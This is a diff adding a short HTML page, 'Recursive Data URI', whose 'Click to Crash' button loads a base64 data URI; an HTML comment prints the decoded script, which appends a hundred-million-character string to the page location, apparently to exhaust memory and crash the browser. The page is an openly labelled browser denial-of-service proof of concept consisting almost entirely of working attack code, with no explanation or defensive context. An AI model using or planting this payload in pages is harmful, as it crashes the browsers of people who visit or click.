@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+    <!-- Decoded Payload
+
+        /* String.repeat isn't always supported */
+        String.prototype.repeat = function( num )
+        {
+            return new Array( num + 1 ).join( this );
+        }
+        location+=location+'A'.repeat(100000000);
+     -->
+    <head>
+        <script>
+            function recursive_crash() {
+                window.location = "data:text/html;base64,PHNjcmlwdD5TdHJpbmcucHJvdG90eXBlLnJlcGVhdCA9IGZ1bmN0aW9uKCBudW0gKSB7IHJldHVybiBuZXcgQXJyYXkoIG51bSArIDEgKS5qb2luKCB0aGlzICk7IH07IGxvY2F0aW9uKz1sb2NhdGlvbisnQScucmVwZWF0KDEwMDAwMDAwMCk7PC9zY3JpcHQ+";
+            }
+        </script>
+    </head>
+    <body>
+        <h1>Recursive Data URI</h1>
+        <hr />
+        <br />
+        <button onclick="recursive_crash()">Click to Crash</button>
+    </body>
+</html>
